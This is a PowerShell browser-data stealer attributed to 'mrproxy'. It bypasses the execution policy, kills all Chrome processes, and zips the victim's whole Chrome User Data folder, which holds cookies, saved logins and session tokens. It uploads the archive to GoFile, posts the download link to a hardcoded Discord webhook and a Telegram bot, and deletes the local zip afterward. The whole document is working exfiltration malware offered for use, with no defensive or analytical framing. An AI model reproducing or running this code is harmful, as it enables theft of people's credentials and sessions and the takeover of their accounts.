# Ensure execution policy is bypassed
Set-ExecutionPolicy Bypass -Scope Process -Force

# Created by mrproxy
$botToken = "your-telegram-bot-token"   # Replace with your Telegram bot token
$chatID = "your-chat-id"               # Replace with your Telegram chat ID
$webhook = "https://discord.com/api/webhooks/1337216489618542663/z9sFeu7hQPxBUEZ81XN_CHsT3eOSQnAV7XraeCcMJFrkYugTolNcnztAnLbiq516mTB0"  # Replace with your Discord Webhook URL

# Debug log file
$logFile = "$env:TEMP\debug_log.txt"

# Function for sending messages through Telegram Bot
function Send-TelegramMessage {
    param ([string]$message)

    if ($botToken -and $chatID) {
        $uri = "https://api.telegram.org/bot$botToken/sendMessage"
        $body = @{ chat_id = $chatID; text = $message }

        try {
            Invoke-RestMethod -Uri $uri -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
            Add-Content -Path $logFile -Value "Message sent to Telegram: $message"
        } catch {
            Add-Content -Path $logFile -Value "Failed to send message to Telegram: $_"
        }
    } else {
        Send-DiscordMessage -message $message
    }
}

# Function for sending messages through Discord Webhook
function Send-DiscordMessage {
    param ([string]$message)

    $body = @{ content = $message }

    try {
        Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
        Add-Content -Path $logFile -Value "Message sent to Discord: $message"
    } catch {
        Add-Content -Path $logFile -Value "Failed to send message to Discord: $_"
    }
}

# Function to upload file and get download link from GoFile
function Upload-FileAndGetLink {
    param (
        [string]$filePath
    )

    # Step 1: Get available GoFile upload server
    $serverResponse = Invoke-RestMethod -Uri 'https://api.gofile.io/servers' -Method Get
    if (-not $serverResponse.data.server) {
        Add-Content -Path $logFile -Value "Failed to get GoFile server: $($serverResponse.status)"
        Send-DiscordMessage -message "Failed to get GoFile server."
        return $null
    }

    $uploadServer = $serverResponse.data.server
    $uploadUri = "https://$uploadServer.gofile.io/contents/uploadfile"

    # Step 2: Check if file exists before attempting upload
    if (-not (Test-Path $filePath)) {
        Add-Content -Path $logFile -Value "File not found: $filePath"
        Send-DiscordMessage -message "File not found for upload."
        return $null
    }

    # Step 3: Prepare file for upload
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
        $fileBase64 = [System.Convert]::ToBase64String($fileBytes)

        # Prepare form-data body
        $body = @{
            file = $fileBase64
        }

        # Step 4: Upload the file
        $response = Invoke-RestMethod -Uri $uploadUri -Method Post -Form $body
        if ($response.status -ne "ok" -or -not $response.data.downloadPage) {
            Add-Content -Path $logFile -Value "Failed to upload file: $($response.status)"
            Send-DiscordMessage -message "Failed to upload file to GoFile."
            return $null
        }

        $downloadLink = $response.data.downloadPage
        Add-Content -Path $logFile -Value "File uploaded successfully: $downloadLink"
        return $downloadLink
    } catch {
        Add-Content -Path $logFile -Value "Error uploading file: $_"
        Send-DiscordMessage -message "Error uploading file to GoFile."
        return $null
    }
}

# Function to create a ZIP file using PowerShell's Compress-Archive
function Zip-WithPowerShell {
    param ([string]$sourceFolder, [string]$zipPath)

    try {
        if (Test-Path $zipPath) { Remove-Item $zipPath -Force }

        # Compress-Archive method (PowerShell native ZIP)
        Compress-Archive -Path "$sourceFolder\*" -DestinationPath $zipPath -Force -ErrorAction Stop

        if (-not (Test-Path $zipPath)) {
            throw "ZIP file was not created successfully."
        }

        Add-Content -Path $logFile -Value "ZIP file created successfully: $zipPath"
    } catch {
        Add-Content -Path $logFile -Value "Failed to create ZIP file: $_"
        Send-DiscordMessage -message "Failed to create ZIP file."
        exit
    }
}

# Define paths
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$outputZip = "$env:TEMP\chrome_data.zip"

# Check if Chrome data exists
if (-not (Test-Path $chromePath)) {
    Send-DiscordMessage -message "Chrome User Data path not found!"
    Add-Content -Path $logFile -Value "Chrome User Data path not found!"
    exit
}

# Force kill ALL Chrome-related processes (to avoid file locks)
Get-Process | Where-Object { $_.Name -match "chrome|google" } | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 5

# Use PowerShell native ZIP method
Zip-WithPowerShell -sourceFolder $chromePath -zipPath $outputZip

# Upload the file and get the link
$link = Upload-FileAndGetLink -filePath $outputZip

# Send the download link
if ($link -ne $null) {
    Send-DiscordMessage -message "Download link: $link"
    Send-TelegramMessage -message "Download link: $link"
    Add-Content -Path $logFile -Value "Download link sent: $link"
} else {
    Send-DiscordMessage -message "Failed to upload file to GoFile.io"
    Add-Content -Path $logFile -Value "Failed to upload file to GoFile.io"
}

# Remove the zip file after uploading
Remove-Item $outputZip -Force
Add-Content -Path $logFile -Value "Deleted zip file after upload."
